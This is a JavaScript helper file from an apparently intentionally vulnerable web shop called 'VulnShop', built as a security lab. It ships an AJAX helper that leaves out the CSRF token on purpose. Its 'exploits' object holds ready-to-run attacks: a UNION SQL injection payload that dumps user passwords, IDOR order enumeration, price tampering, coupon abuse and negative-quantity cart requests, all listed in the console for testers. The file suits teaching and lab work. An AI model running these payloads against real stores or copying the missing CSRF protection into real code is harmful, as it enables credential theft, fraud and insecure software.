/* VulnShop — client-side helpers for vulnerability demos */

// VULN: CSRF token not sent in AJAX — intentional
function apiCall(url, method, data) {
    return fetch(url, {
        method: method || 'GET',
        headers: { 'Content-Type': 'application/json' },
        // VULN: no CSRF token in headers
        body: data ? JSON.stringify(data) : undefined,
    }).then(r => r.json());
}

// Exploit helpers for testing
const exploits = {
    // SQLi: dumps users via UNION
    sqliDump: () => {
        const payload = "' UNION SELECT username,password,email,3,4,5,6,7,8,9,10 FROM auth_user--";
        window.location.href = `/search/?q=${encodeURIComponent(payload)}`;
    },

    // IDOR: enumerate orders
    idorOrders: (maxId = 20) => {
        for (let i = 1; i <= maxId; i++) {
            fetch(`/order/${i}/`).then(r => {
                if (r.ok) console.log(`Order #${i} accessible!`);
            });
        }
    },

    // Price manipulation
    manipulatePrice: (orderId, newTotal = '0.01') => {
        return apiCall(`/order/${orderId}/update/`, 'POST', { total: newTotal });
    },

    // Unlimited coupon
    spamCoupon: (code = 'ADMIN100', times = 10) => {
        const results = [];
        for (let i = 0; i < times; i++) {
            results.push(
                fetch('/cart/coupon/', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `code=${code}`,
                }).then(r => r.json())
            );
        }
        return Promise.all(results);
    },

    // Negative quantity cart
    negativeCart: (productId = 1, quantity = -9999) => {
        return fetch('/cart/add/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `product_id=${productId}&quantity=${quantity}`,
        }).then(r => r.json());
    },
};

// Log exploits to console for testers
console.log('%c⚠️  VulnShop Security Lab', 'font-size:16px;color:#c62828;font-weight:bold');
console.log('%cAvailable exploit helpers:', 'color:#e65100');
console.log('  exploits.sqliDump()            - SQL injection user dump');
console.log('  exploits.idorOrders(20)         - IDOR order enumeration');
console.log('  exploits.manipulatePrice(1,0.01)- Price manipulation');
console.log('  exploits.spamCoupon("ADMIN100") - Unlimited coupon');
console.log('  exploits.negativeCart(1,-9999)  - Negative quantity');
